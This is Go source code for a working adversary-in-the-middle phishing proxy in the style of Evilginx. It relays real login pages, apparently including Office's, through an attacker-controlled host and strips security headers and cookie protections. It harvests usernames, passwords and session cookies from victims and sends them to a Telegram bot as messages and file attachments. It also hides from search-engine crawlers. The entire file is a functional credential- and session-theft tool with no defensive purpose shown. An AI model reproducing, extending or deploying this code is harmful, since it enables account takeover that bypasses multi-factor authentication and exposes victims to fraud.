// proxy-server — Evilginx-style AiTM reverse proxy with Telegram capture.
// Phishlet configs define per-provider login flows, credential fields, and session cookies.
// Victim sees the REAL login page proxied through us.

package main

import (
	"bytes"
	"crypto/tls"
	"embed"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strings"
	"time"
)

//go:embed bootloader.html
var bootloaderFS embed.FS

var (
	telegramToken  string
	telegramChatID string
	phishingHost   string
	phishlets      []Phishlet
)

func main() {
	telegramToken = os.Getenv("TELEGRAM_BOT_TOKEN")
	telegramChatID = os.Getenv("TELEGRAM_CHAT_ID")
	phishingHost = os.Getenv("PHISHING_HOST")
	if phishingHost == "" {
		phishingHost = "localhost:9091"
	}

	port := os.Getenv("PORT")
	if port == "" {
		port = "9091"
	}

	// Load phishlet configs
	var err error
	phishlets, err = loadPhishlets()
	if err != nil {
		log.Fatalf("FATAL: cannot load phishlets: %v", err)
	}
	if len(phishlets) == 0 {
		log.Fatal("FATAL: no phishlets loaded")
	}

	bootloaderHTML, err := bootloaderFS.ReadFile("bootloader.html")
	if err != nil {
		log.Fatalf("FATAL: cannot read embedded bootloader.html: %v", err)
	}
	log.Printf("Bootloader loaded: %d bytes", len(bootloaderHTML))

	rl := NewRateLimiter()

	mux := http.NewServeMux()
	mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("ok"))
	})

	// All paths go through proxy handler — bot/cookie check at top
	mux.HandleFunc("/", rl.Middleware(func(w http.ResponseWriter, r *http.Request) {
		handleRequest(w, r, bootloaderHTML)
	}))

	log.Printf("Proxy server listening on :%s (%d phishlets)", port, len(phishlets))
	handler := http.MaxBytesHandler(blockBots(securityHeaders(mux)), 64<<10)
	log.Fatal(http.ListenAndServe(":"+port, handler))
}

func handleRequest(w http.ResponseWriter, r *http.Request, bootloaderHTML []byte) {
	upstreamCookie, err := r.Cookie("_s")
	if err != nil || upstreamCookie.Value == "" {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write(bootloaderHTML)
		return
	}

	upstreamURL, _ := url.QueryUnescape(upstreamCookie.Value)
	if upstreamURL == "" || !strings.HasPrefix(upstreamURL, "http") {
		w.Write(bootloaderHTML)
		return
	}

	// Match phishlet from upstream host
	pl := matchPhishlet(phishlets, upstreamURL)
	if pl == nil {
		log.Printf("[proxy] no phishlet matches upstream %s", upstreamURL)
		w.Write(bootloaderHTML)
		return
	}

	serveProxy(w, r, upstreamURL, pl)
}

func serveProxy(w http.ResponseWriter, r *http.Request, upstream string, pl *Phishlet) {
	target, err := url.Parse(upstream)
	if err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	var reqBody []byte
	if r.Body != nil && r.Method == "POST" {
		reqBody, _ = io.ReadAll(r.Body)
		r.Body = io.NopCloser(bytes.NewReader(reqBody))
	}

	victimCookies := r.Cookies()

	proxy := &httputil.ReverseProxy{
		Director: func(req *http.Request) {
			req.URL.Scheme = target.Scheme
			req.URL.Host = target.Host
			req.Host = target.Host

			// Strip Accept-Encoding so upstream returns uncompressed (we rewrite body)
			req.Header.Del("Accept-Encoding")

			if req.Header.Get("Referer") != "" {
				req.Header.Set("Referer", strings.Replace(req.Header.Get("Referer"),
					phishingHost, target.Host, 1))
			}

			req.Header.Del("Cookie")
			for _, c := range victimCookies {
				if c.Name != "_s" && c.Name != "_c" {
					req.AddCookie(c)
				}
			}
		},
		ModifyResponse: func(resp *http.Response) error {
			capturedCookies := resp.Header.Values("Set-Cookie")
			rewriteResponse(resp, target.Host, phishingHost, pl)
			rewriteBody(resp, target.Host, pl.Hostname)
			go notifyCapture(r, reqBody, victimCookies, capturedCookies, upstream, pl)
			return nil
		},
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	proxy.ServeHTTP(w, r)
}

func rewriteResponse(resp *http.Response, upstreamHost, ourHost string, pl *Phishlet) {
	if pl.Rewrite.StripCookieDomain || pl.Rewrite.StripCookieSecure {
		cookies := resp.Header.Values("Set-Cookie")
		resp.Header.Del("Set-Cookie")
		for _, c := range cookies {
			if pl.Rewrite.StripCookieDomain {
				c = strings.ReplaceAll(c, "domain="+upstreamHost, "")
				c = strings.ReplaceAll(c, "domain=."+upstreamHost, "")
				c = strings.ReplaceAll(c, "Domain="+upstreamHost, "")
				c = strings.ReplaceAll(c, "Domain=."+upstreamHost, "")
			}
			if pl.Rewrite.StripCookieSecure {
				c = strings.ReplaceAll(c, "; Secure", "")
				c = strings.ReplaceAll(c, "; secure", "")
			}
			resp.Header.Add("Set-Cookie", c)
		}
	}

	if pl.Rewrite.StripCSP {
		resp.Header.Del("Content-Security-Policy")
		resp.Header.Del("Content-Security-Policy-Report-Only")
	}
	if pl.Rewrite.StripXFO {
		resp.Header.Del("X-Frame-Options")
	}
	if pl.Rewrite.StripHSTS {
		resp.Header.Del("Strict-Transport-Security")
	}
	if pl.Rewrite.RewriteLocation {
		if loc := resp.Header.Get("Location"); loc != "" {
			loc = strings.ReplaceAll(loc, upstreamHost, ourHost)
			loc = strings.ReplaceAll(loc, "www.office.com", ourHost)
			loc = strings.ReplaceAll(loc, "office.com", ourHost)
			resp.Header.Set("Location", loc)
		}
	}
}

func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie, capturedCookies []string, upstream string, pl *Phishlet) {
	telegramOk := telegramToken != "" && telegramChatID != ""
	if !telegramOk {
		log.Println("[telegram] bot not configured — skipping notification")
	}

	// Extract credentials using phishlet's field definitions
	var username, password string
	if len(reqBody) > 0 {
		bodyStr := string(reqBody)
		username = pl.extractUsername(bodyStr)
		if username == "" {
			username = extractFirstField(bodyStr)
		}
		password = pl.extractPassword(bodyStr)
	}

	// Write analytics event
	captureTime := time.Now().UTC().Format(time.RFC3339)
	campaignCookie, _ := r.Cookie("_c")
	campaignID := ""
	if campaignCookie != nil {
		campaignID = campaignCookie.Value
	}
	writeEvent(map[string]interface{}{
		"timestamp":   captureTime,
		"campaign_id": campaignID,
		"brand":       pl.Name,
		"username":    username,
		"ip":          r.RemoteAddr,
		"user_agent":  r.UserAgent(),
		"status":      "success",
		"source":      "proxy",
	})

	if !telegramOk {
		return
	}

	captureTimeDisplay := time.Now().UTC().Format("2006-01-02 15:04:05 MST")
	ip := r.RemoteAddr
	ua := r.UserAgent()

	msg := fmt.Sprintf("🔴 CAPTURE | %s | %s\n"+
		"Username: %s\n"+
		"Password: %s\n"+
		"IP: %s\n"+
		"User-Agent: %s\n"+
		"Time: %s\n"+
		"Upstream: %s",
		pl.Label, username,
		username, password,
		ip, ua,
		captureTimeDisplay, upstream)

	sendTelegramMessage(msg)

	// Build .txt attachment with session cookies (filtered by phishlet)
	var sessionLines []string
	var otherLines []string
	for _, c := range capturedCookies {
		name := strings.SplitN(c, "=", 2)[0]
		if pl.isSessionCookie(name) {
			sessionLines = append(sessionLines, c)
		} else {
			otherLines = append(otherLines, c)
		}
	}

	if len(sessionLines) > 0 || len(otherLines) > 0 {
		txtContent := fmt.Sprintf("=== AiTM Session Capture ===\n"+
			"Target: %s (%s)\nUsername: %s\nIP: %s\nTime: %s\n\n",
			upstream, pl.Label, username, ip, captureTimeDisplay)

		if len(sessionLines) > 0 {
			txtContent += "--- Session Cookies (captured) ---\n"
			for _, c := range sessionLines {
				txtContent += c + "\n"
			}
		}
		if len(otherLines) > 0 {
			txtContent += "\n--- Other Cookies ---\n"
			for _, c := range otherLines {
				txtContent += c + "\n"
			}
		}
		txtContent += fmt.Sprintf("\n--- Victim Cookies ---\n")
		for _, c := range victimCookies {
			txtContent += fmt.Sprintf("%s=%s\n", c.Name, c.Value)
		}

		filename := fmt.Sprintf("session-%s.txt", time.Now().UTC().Format("20060102-150405"))
		sendTelegramDocument(msg, filename, []byte(txtContent))
	}
}

// rewriteBody replaces upstream domain references in text responses so the
// browser continues routing all requests through our proxy domain.
func rewriteBody(resp *http.Response, upstreamHost, ourHost string) {
	ct := resp.Header.Get("Content-Type")
	if ct == "" {
		return
	}
	rewritable := []string{
		"text/html", "text/javascript", "application/javascript",
		"application/json", "text/css", "application/x-javascript", "text/plain",
	}
	rewrite := false
	for _, t := range rewritable {
		if strings.Contains(ct, t) {
			rewrite = true
			break
		}
	}
	if !rewrite {
		return
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	resp.Body.Close()

	rewritten := strings.ReplaceAll(string(body), upstreamHost, ourHost)
	for _, alt := range []string{"www.office.com", "office.com"} {
		if alt != upstreamHost {
			rewritten = strings.ReplaceAll(rewritten, alt, ourHost)
		}
	}

	resp.Body = io.NopCloser(strings.NewReader(rewritten))
	resp.ContentLength = int64(len(rewritten))
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(rewritten)))
	resp.Header.Del("Content-Encoding") // deflate/gzip won't match rewritten body
}

func extractFormField(body, field string) string {
	for _, part := range strings.Split(body, "&") {
		kv := strings.SplitN(part, "=", 2)
		if len(kv) == 2 {
			key, _ := url.QueryUnescape(kv[0])
			val, _ := url.QueryUnescape(kv[1])
			if strings.EqualFold(key, field) {
				return val
			}
		}
	}
	return ""
}

func extractFirstField(body string) string {
	for _, part := range strings.Split(body, "&") {
		kv := strings.SplitN(part, "=", 2)
		if len(kv) == 2 && kv[1] != "" && !strings.Contains(kv[0], "uuid") && !strings.Contains(kv[0], "redirect") && !strings.Contains(kv[0], "csrf") && !strings.Contains(kv[0], "ctx") {
			val, _ := url.QueryUnescape(kv[1])
			return val
		}
	}
	return ""
}

// ---- Telegram API ----

func sendTelegramMessage(text string) {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramToken)
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	w.WriteField("chat_id", telegramChatID)
	w.WriteField("text", text)
	w.Close()

	req, _ := http.NewRequest("POST", apiURL, &buf)
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("[telegram] send message error: %v", err)
		return
	}
	resp.Body.Close()
	log.Printf("[telegram] message sent")
}

func sendTelegramDocument(caption, filename string, content []byte) {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", telegramToken)
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	w.WriteField("chat_id", telegramChatID)
	w.WriteField("caption", caption)
	part, _ := w.CreateFormFile("document", filename)
	part.Write(content)
	w.Close()

	req, _ := http.NewRequest("POST", apiURL, &buf)
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("[telegram] send document error: %v", err)
		return
	}
	resp.Body.Close()
	log.Printf("[telegram] document sent: %s", filename)
}

func writeEvent(ev map[string]interface{}) {
	raw, err := json.Marshal(ev)
	if err != nil {
		log.Printf("[jsonl] marshal error: %v", err)
		return
	}
	f, err := os.OpenFile("../data/captures.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		log.Printf("[jsonl] open error: %v", err)
		return
	}
	defer f.Close()
	if _, err := f.Write(append(raw, '\n')); err != nil {
		log.Printf("[jsonl] write error: %v", err)
	}
}

// --- Security middleware ---

func securityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("Referrer-Policy", "no-referrer")
		next.ServeHTTP(w, r)
	})
}

var botPatterns = []string{
	"Googlebot", "Bingbot", "Baiduspider", "DuckDuckBot",
	"YandexBot", "Slurp", "Facebot", "Twitterbot",
	"PetalBot", "Applebot", "AhrefsBot", "SemrushBot",
	"DotBot", "Screaming Frog", "Bytespider",
}

func blockBots(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ua := r.UserAgent()
		for _, p := range botPatterns {
			if strings.Contains(ua, p) {
				w.WriteHeader(http.StatusNotFound)
				w.Write([]byte("<html><body></body></html>"))
				return
			}
		}
		next.ServeHTTP(w, r)
	})
}
